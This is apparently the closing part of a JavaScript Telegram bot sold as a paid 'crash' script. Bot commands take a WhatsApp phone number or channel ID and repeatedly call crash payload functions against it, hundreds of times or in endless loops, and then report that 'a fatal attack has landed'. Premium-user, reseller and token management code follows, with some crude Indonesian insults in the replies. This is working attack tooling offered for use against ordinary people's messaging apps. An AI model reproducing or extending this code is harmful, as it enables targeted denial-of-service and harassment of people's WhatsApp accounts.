    await client.relayMessage(bijipler, message, { participant: { jid: bijipler } });
}

bot.command("systemui", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628XXXX`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`Targeting : ${zepnumb}\nStatus : still in process\nThe process of launching a fatal attack`);

    for (let i = 0; i < 500; i++) {
      await killui(bijipler, Ptcp = true);
        await VampPrivateBlank(bijipler);
        await UIXFC(bijipler);
        await LalaCrash(bijipler);
        await LalaAttack(bijipler);
        await CrashNewBeta(bijipler);
        await LalaDoct(bijipler);
        await killui(bijipler, ptcp = true);
        await VampDelayCrash(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by cosmo`
    );
});

bot.command("casper", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628XXXX`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`Targeting : ${zepnumb}\nStatus : done delay mention`);

    while (true) {
        await btnStatus(bijipler, true)
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by cosmo`
    );
});

bot.command("delayxui", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628XXXX`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`Targeting : ${zepnumb}\nStatus : Successfully`);

    while (true) {
        await btnStatus(bijipler, true)
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by cosmo`
    );
});


bot.command("invisiblev2", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628XXXX`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`Targeting : ${zepnumb}\nStatus : Successfully`);

    while (true) {
        await btnStatus(bijipler, true);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by cosmo`
    );
});

bot.command("crashdelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628XXXX`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`Targeting : ${zepnumb}\nStatus : still in process\nThe process of launching a fatal attack`);

    for (let i = 0; i < 600; i++) {
        await VampDelayCrash(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by cosmo`
    );
});

bot.command("nebula", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd 628XXXX`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`Targeting : ${zepnumb}\nStatus : still in process\nThe process of launching a fatal attack`);

    for (let i = 0; i < 300; i++) {
        await LalaCrash(bijipler);
        await UIXFC(bijipler);
        await VampDelayCrash(bijipler);
        await VampPrivateBlank(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by cosmo`
    );
});

bot.command("crashch", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd <id channel>`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@newsletter";

    let ProsesZephy = await ctx.reply(`Targeting : ${zepnumb}\nStatus : still in process\nThe process of launching a fatal attack`);

    for (let i = 0; i < 500; i++) {
        await payoutzep(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by cosmo`
    );
});

bot.command("vincere", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/cmd <id channel>`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@newsletter";

    let ProsesZephy = await ctx.reply(`Targeting : ${zepnumb}\nStatus : still in process\nThe process of launching a fatal attack`);

    for (let i = 0; i < 300; i++) {
        await buttoncast(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by cosmo`
    );
});

bot.command('addprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`Si kontol ${userId} sekarang memiliki akses premium!`);
});

bot.command('delprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Anda adalah pengguna premium.`);
    } else {
        return ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

bot.command('addresellers', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan fitur ini.");
    }

    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Anda perlu memberikan ID reseller setelah perintah. Contoh: /addreseller 12345");
    }

    const resellerId = args[1];
    if (resellers.includes(resellerId)) {
        return ctx.reply(`❌ Reseller dengan ID ${resellerId} sudah terdaftar.`);
    }

    const success = await addReseller(resellerId);

    if (success) {
        return ctx.reply(`✅ Reseller dengan ID ${resellerId} berhasil ditambahkan.`);
    } else {
        return ctx.reply(`❌ Gagal menambahkan reseller dengan ID ${resellerId}.`);
    }
});

bot.command('addtokens', checkReseller, async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan fitur ini.");
    }

    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Anda perlu memberikan token setelah perintah. Contoh: /addtoken YOUR_TOKEN_HERE");
    }

    const newToken = args[1];

    const success = await addToken(newToken);

    if (success) {
        return ctx.reply(`✅ Token \`${newToken}\` berhasil ditambahkan.`, { parse_mode: 'Markdown' });
    } else {
        return ctx.reply(`❌ Gagal menambahkan token \`${newToken}\`.`, { parse_mode: 'Markdown' });
    }
});

const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => {
      pm2.disconnect();
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};

bot.command('restart', (ctx) => {
  const userId = ctx.from.id.toString();
  ctx.reply('Merestart bot...');
  restartBot();
});

 
(async () => {
    console.clear();
    console.log("Memeriksa security...");
    await initializeOctokit();

    await verifyBotToken();

    console.log("Sedang menginisiasi database reseller..");
    await loadResellersFromGitHub();
    console.log("✅ Reseller berhasil diinisialisasi.");

    console.log("🚀 Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses connected");
    bot.launch();

    console.clear();
    console.log(chalk.bold.blue("\nHEFAISTOS HADES"));
    console.log(chalk.bold.white("DEVELOPER: COSMO"));
    console.log(chalk.bold.white("VERSION: 2.0"));
    console.log(chalk.bold.white("ACCESS: ") + chalk.bold.green("YES"));
    console.log(chalk.bold.white("STATUS: ") + chalk.bold.green("ONLINE\n\n"));
    console.log(chalk.bold.yellow("THANKS FOR BUYING THIS SCRIPT FROM OWNER/DEVELOPER"));
})();